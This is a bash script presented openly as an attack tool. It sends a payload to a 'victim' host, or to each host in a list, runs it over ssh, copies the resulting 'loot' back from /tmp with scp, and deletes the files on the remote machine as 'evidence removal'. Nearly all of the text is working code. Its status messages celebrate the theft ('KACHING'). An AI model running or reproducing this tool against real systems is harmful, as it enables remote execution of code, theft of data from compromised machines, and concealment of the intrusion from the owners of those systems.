#!/bin/bash
# Upload a file to the victim, executes it, downloads result, and remove evidence.
# Retrieves results from /tmp directory starting with "pwned_"

# Config

DOWNLOADFROM=/tmp/pwn_
DOWNLOADTO=~/Downloads/.

# Colored Status Constants

status="\033[1m\033[94m[*]\033[0m"
good="\033[1m\033[92m[+] SUCCESS:\033[0m"
error="\033[1m\033[91m[-] ERROR:\033[0m"
warning="\033[1m\033[93m[!]\033[0m"
money="\033[1m\033[92m[$] KACHING:\033[0m"

# Check Requirements

if [[ ! -x $(which scp) ]] ||
   [[ ! -x $(which ssh) ]]; then
    echo "$error Both ssh and scp are required!" >&2
    exit 1
fi

if [[ $# -lt 1 ]]
then
	echo -e "$status Usage: $0 [payload location] [optional: host file list]"
	exit 1
fi

PAYLOAD=$1

if [ -f $PAYLOAD ]
then
	echo -e "\n$status Loaded $PAYLOAD"
else
	echo -e "$error Unable to locate $PAYLOAD. Exiting..."
	exit 1
fi

# Check Optional Requirements

HOSTS=$2

if [ -f $HOSTS ]
then
	echo -e "$status Loaded $HOSTS list"
fi

if [ -f ~/.ssh/config ]
then
	echo -e "$status Loaded ssh config file"
else
	echo -e "$warning Unable to locate ssh config file, run addsshconfig.sh."
fi

if ssh-add -l &> /dev/null
then
	echo -e "$status Loaded ssh key in ssh agent"
else
	echo -e "$warning No key loaded into ssh agent, run addsshkey.sh."
fi

# Launch Function

function launch {
	echo -e "\n$status Attempting to execute payload on $1..."
	if ssh $USER@$1 "bash -s" < $PAYLOAD 2> /dev/null
	then
		echo -e "$good Payload execution... Done."
	else
		echo -e "$error Failed to complete payload execution! Exiting..."
		exit 1
	fi

	echo -e "\n$status Attempting to extract the valuable loot..."
	if scp -r $USER@$1:$DOWNLOADFROM* $DOWNLOADTO 2> /dev/null
	then
		echo -e "$money Loot extraction... Done."
	else
		echo -e "$error Failed to extract loot from $DOWNLOADFROM. Exiting..."
		exit 1
	fi

	echo -e "\n$status Attempting to remove evidence..."
	if ssh $USER@$1 "rm -rf $DOWNLOADFROM*" 2> /dev/null
	then
		echo -e "$good Evidence removal... Done.\n"
	else
		echo -e "$error Failed to remove evidence. Exiting..."
		exit 1
	fi
}

# User Input

echo -ne "$status Enter remote user: "
read USER
if [ -z "$HOSTS" ]
then
	echo -ne "$status Enter remote host: "
	read IP
	launch $IP
else
	while read HOST
	do
		launch $HOST
	done <$HOSTS
fi

